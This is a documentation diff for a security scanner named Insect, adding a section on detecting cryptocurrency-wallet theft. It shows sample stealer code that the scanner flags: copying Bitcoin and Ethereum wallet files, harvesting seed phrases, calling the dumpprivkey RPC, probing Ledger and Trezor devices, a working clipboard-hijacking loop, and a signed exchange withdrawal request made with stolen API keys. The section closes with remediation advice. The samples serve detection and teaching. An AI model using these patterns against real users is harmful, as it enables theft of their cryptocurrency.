@@ -16,6 +16,7 @@ This document provides examples of common security issues that Insect can detect
 - [Configuration Security Issues](#configuration-security-issues)
 - [Secret Detection](#secret-detection)
 - [Browser Data Theft Detection](#browser-data-theft-detection)
+- [Cryptocurrency Wallet Theft Detection](#cryptocurrency-wallet-theft-detection)
 
 ## Python Security Issues
 
@@ -658,3 +659,354 @@ function getUserPreferences() {
 3. **Secure Transmission**: Use HTTPS for any data transmission
 4. **Data Minimization**: Don't store or transmit more data than necessary
 5. **User Control**: Provide users with options to view, modify, or delete stored data
+
+## Cryptocurrency Wallet Theft Detection
+
+Insect can detect malicious code that attempts to steal cryptocurrency wallets, private keys, and other crypto assets. This protection helps identify repositories that may be designed to harvest cryptocurrency from users.
+
+### Wallet File Access
+
+**Vulnerable Code:**
+
+```python
+import os
+import shutil
+
+def steal_wallet_files():
+    # Malicious code accessing Bitcoin wallet
+    bitcoin_wallet = os.path.expanduser("~/.bitcoin/wallet.dat")
+    
+    # Access Ethereum keystore
+    ethereum_keystore = os.path.expanduser("~/.ethereum/keystore/UTC--2023-01-01T00-00-00.000Z--abcd1234")
+    
+    # Access Electrum wallet
+    electrum_wallet = os.path.expanduser("~/.electrum/wallets/default_wallet")
+    
+    # Copy wallet files to attacker location
+    shutil.copy(bitcoin_wallet, "/tmp/stolen_bitcoin.dat")
+    shutil.copy(ethereum_keystore, "/tmp/stolen_eth.json")
+```
+
+**What Insect Detects:**
+- Identifies access to common wallet file patterns (`wallet.dat`, keystore files)
+- Flags attempts to copy or read cryptocurrency wallet directories
+- Detects suspicious file path patterns targeting crypto wallet storage
+
+**Why This is Critical:**
+- Wallet files contain encrypted private keys needed to spend cryptocurrency
+- Stolen wallet files can lead to complete loss of crypto assets
+- Often targeted by malware and cryptocurrency stealers
+
+### Private Key Extraction
+
+**Vulnerable Code:**
+
+```python
+import hashlib
+import base58
+
+def extract_private_keys():
+    # Extract Bitcoin private key
+    private_key_hex = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+    
+    # WIF encoded private key
+    wif_key = "5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS"
+    
+    # Decrypt wallet private key
+    encrypted_key = b"encrypted_private_key_data"
+    decrypted_privkey = decrypt_key(encrypted_key, "password123")
+    
+    # Extract extended private key (BIP32)
+    xprv = "xprv9s21ZrQH143K3QTDL4LXw2F7HEK3wJUD2nW2nRk4stbPy6cq3jPPqjiChkVvvNKmPGJxWUtg6LnF5kejMRNNU3TGtRBeJgk33yuGBxrMPHi"
+    
+    # Send stolen keys to attacker server
+    exfiltrate_keys([private_key_hex, wif_key, xprv])
+```
+
+**What Insect Detects:**
+- Identifies patterns that look like cryptocurrency private keys
+- Flags attempts to decrypt or extract private keys from wallet files
+- Detects suspicious key derivation and manipulation code
+- Identifies private key formats (hex, WIF, extended keys)
+
+**Why This is Critical:**
+- Private keys provide complete control over cryptocurrency funds
+- Anyone with access to private keys can steal all associated cryptocurrency
+- Private key theft is irreversible and untraceable
+
+### Seed Phrase Harvesting
+
+**Vulnerable Code:**
+
+```python
+import mnemonic
+
+def harvest_seed_phrases():
+    # Steal mnemonic seed phrases
+    seed_phrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
+    
+    # Extract recovery phrases from user input
+    recovery_phrase = input("Enter your 12-word recovery phrase: ")
+    
+    # Validate mnemonic for exploitation
+    mnemo = mnemonic.Mnemonic("english")
+    if mnemo.check(recovery_phrase):
+        # Send stolen seed to attacker
+        steal_seed_phrase(recovery_phrase)
+    
+    # Look for 24-word phrases
+    long_phrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art"
+    
+    # Extract entropy from seed
+    entropy = mnemo.to_entropy(seed_phrase)
+    
+    return {
+        "stolen_seed": recovery_phrase,
+        "entropy": entropy
+    }
+```
+
+**What Insect Detects:**
+- Identifies references to mnemonic seed phrases and recovery phrases
+- Flags attempts to validate or process BIP39 word lists
+- Detects suspicious entropy extraction from seed phrases
+- Identifies patterns consistent with seed phrase theft
+
+**Why This is Critical:**
+- Seed phrases can regenerate all private keys for a wallet
+- Complete wallet recovery is possible with just the seed phrase
+- Seed phrase theft affects all cryptocurrencies in a hierarchical deterministic wallet
+
+### Cryptocurrency API Abuse
+
+**Vulnerable Code:**
+
+```python
+import requests
+
+def abuse_crypto_apis():
+    # Bitcoin RPC abuse
+    bitcoin_rpc = {
+        "jsonrpc": "1.0",
+        "method": "dumpprivkey",
+        "params": ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"]
+    }
+    
+    response = requests.post("http://localhost:8332/", 
+                           json=bitcoin_rpc,
+                           auth=("user", "password"))
+    
+    # Blockchain API abuse for mass balance checking
+    addresses = ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"]
+    for addr in addresses:
+        balance_url = f"https://blockchain.info/q/addressbalance/{addr}"
+        balance_response = requests.get(balance_url)
+        
+        if balance_response.text != "0":
+            # Target addresses with funds
+            target_wealthy_address(addr)
+```
+
+**What Insect Detects:**
+- Identifies suspicious calls to cryptocurrency RPC endpoints
+- Flags attempts to extract private keys via blockchain APIs
+- Detects mass address balance checking patterns
+- Identifies suspicious blockchain explorer API usage
+
+**Why This is Dangerous:**
+- RPC calls like `dumpprivkey` expose private keys
+- Mass balance checking is often used for address enumeration attacks
+- Blockchain API abuse can lead to wallet compromise
+
+### Hardware Wallet Access
+
+**Vulnerable Code:**
+
+```python
+import hid
+import usb.core
+
+def access_hardware_wallets():
+    # Ledger device access
+    ledger_vendor_id = 0x2c97
+    ledger_devices = hid.enumerate(ledger_vendor_id)
+    
+    for device in ledger_devices:
+        ledger_device = hid.device()
+        ledger_device.open(device['vendor_id'], device['product_id'])
+        
+        # Send malicious command to Ledger
+        command = b"\xe0\x40\x00\x00\x00"  # Get app configuration
+        ledger_device.write(command)
+        response = ledger_device.read(255)
+        
+        # Extract sensitive data from hardware wallet
+        extract_wallet_data(response)
+    
+    # Trezor device access
+    trezor_vendor_id = 0x534c
+    trezor_devices = usb.core.find(find_all=True, idVendor=trezor_vendor_id)
+    
+    for device in trezor_devices:
+        # Send unauthorized commands
+        device.write(0x01, b"malicious_payload")
+```
+
+**What Insect Detects:**
+- Identifies attempts to access hardware wallet devices (Ledger, Trezor, KeepKey)
+- Flags suspicious USB/HID device communication
+- Detects unauthorized hardware wallet command sequences
+
+**Why This is Critical:**
+- Hardware wallets are considered the most secure way to store cryptocurrency
+- Unauthorized access attempts indicate sophisticated attack methods
+- Compromise of hardware wallets can lead to significant financial losses
+
+### Cryptocurrency Stealer Behavior
+
+**Vulnerable Code:**
+
+```python
+import pyperclip
+import re
+import time
+
+def crypto_clipper():
+    # Monitor clipboard for crypto addresses
+    btc_pattern = r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}'
+    eth_pattern = r'0x[a-fA-F0-9]{40}'
+    
+    # Attacker's addresses
+    attacker_btc = "1AttackerBitcoinAddress123456789"
+    attacker_eth = "0xAttackerEthereumAddress1234567890abcdef"
+    
+    while True:
+        # Monitor clipboard content
+        clipboard_data = pyperclip.paste()
+        
+        # Replace legitimate addresses with attacker's addresses
+        if re.match(btc_pattern, clipboard_data):
+            pyperclip.copy(attacker_btc)
+            log_stolen_address(clipboard_data, attacker_btc)
+        
+        elif re.match(eth_pattern, clipboard_data):
+            pyperclip.copy(attacker_eth)
+            log_stolen_address(clipboard_data, attacker_eth)
+        
+        time.sleep(0.1)  # Check every 100ms
+```
+
+**What Insect Detects:**
+- Identifies clipboard monitoring for cryptocurrency addresses
+- Flags address replacement patterns (clipboard hijacking)
+- Detects cryptocurrency address regex patterns used for interception
+- Identifies stealer-like behavior patterns
+
+**Why This is Critical:**
+- Clipboard hijacking redirects cryptocurrency payments to attacker addresses
+- Users often don't notice address changes, leading to successful theft
+- This is a common attack vector for cryptocurrency theft malware
+
+### Exchange API Abuse
+
+**Vulnerable Code:**
+
+```python
+import hmac
+import hashlib
+import requests
+
+def abuse_exchange_apis():
+    # Stolen exchange API credentials
+    binance_api_key = "stolen_api_key_123"
+    binance_secret_key = "stolen_secret_key_456"
+    
+    # Unauthorized withdrawal
+    withdraw_params = {
+        "coin": "BTC",
+        "address": "1AttackerAddress123",
+        "amount": "1.0",
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    # Sign the malicious request
+    query_string = "&".join([f"{k}={v}" for k, v in withdraw_params.items()])
+    signature = hmac.new(binance_secret_key.encode(), query_string.encode(), hashlib.sha256).hexdigest()
+    
+    # Execute unauthorized withdrawal
+    response = requests.post(
+        "https://api.binance.com/sapi/v1/capital/withdraw/apply",
+        params={**withdraw_params, "signature": signature},
+        headers={"X-MBX-APIKEY": binance_api_key}
+    )
+```
+
+**What Insect Detects:**
+- Identifies suspicious cryptocurrency exchange API usage
+- Flags patterns consistent with unauthorized withdrawals
+- Detects exchange API authentication abuse
+- Identifies withdrawal and transfer operations using stolen credentials
+
+**Why This is Critical:**
+- Exchange APIs can control large amounts of cryptocurrency
+- Stolen API keys enable direct fund theft
+- Exchange API abuse can drain entire trading accounts
+
+### Remediation Strategies
+
+**General Recommendations:**
+
+1. **Remove Crypto Theft Code**: Immediately remove any code that accesses cryptocurrency wallets or keys without authorization
+2. **Use Secure Development Practices**: Follow cryptocurrency security best practices for legitimate crypto applications
+3. **Implement User Consent**: Always obtain explicit user consent before accessing any cryptocurrency-related data
+4. **Follow Legal Guidelines**: Ensure compliance with financial regulations and anti-theft laws
+5. **Regular Security Audits**: Regularly audit code for potential cryptocurrency theft vulnerabilities
+
+**For Legitimate Cryptocurrency Development:**
+
+```python
+# Example of legitimate cryptocurrency wallet interaction
+import os
+from cryptography.fernet import Fernet
+
+class SecureWallet:
+    def __init__(self, user_consent=False):
+        if not user_consent:
+            raise ValueError("User consent required for wallet operations")
+        
+        # Only access user's own wallet with explicit consent
+        self.wallet_path = os.path.expanduser("~/.myapp/wallet.dat")
+    
+    def create_wallet(self, password):
+        # Secure wallet creation with user-provided password
+        key = Fernet.generate_key()
+        encrypted_key = self.encrypt_key(key, password)
+        
+        # Store encrypted wallet securely
+        with open(self.wallet_path, 'wb') as f:
+            f.write(encrypted_key)
+    
+    def get_public_address(self):
+        # Only return public information, never private keys
+        return self.derive_public_address()
+    
+    def sign_transaction(self, transaction, password):
+        # Secure transaction signing with user authentication
+        private_key = self.decrypt_private_key(password)
+        signature = self.sign_with_key(transaction, private_key)
+        
+        # Clear private key from memory immediately
+        del private_key
+        return signature
+```
+
+**Security Best Practices:**
+
+1. **Never Access Other Users' Wallets**: Only access wallet data that belongs to your application's users with explicit consent
+2. **Secure Key Storage**: Use proper encryption and key derivation for storing sensitive data
+3. **Minimal Privilege**: Only request the minimum permissions necessary for your application
+4. **Audit Dependencies**: Regularly audit third-party libraries for security vulnerabilities
+5. **User Education**: Educate users about cryptocurrency security best practices
+6. **Transparent Operations**: Clearly document all cryptocurrency operations your application performs
+7. **Secure Communication**: Use HTTPS and proper authentication for all API communications
+8. **Regular Updates**: Keep cryptocurrency libraries and dependencies up to date
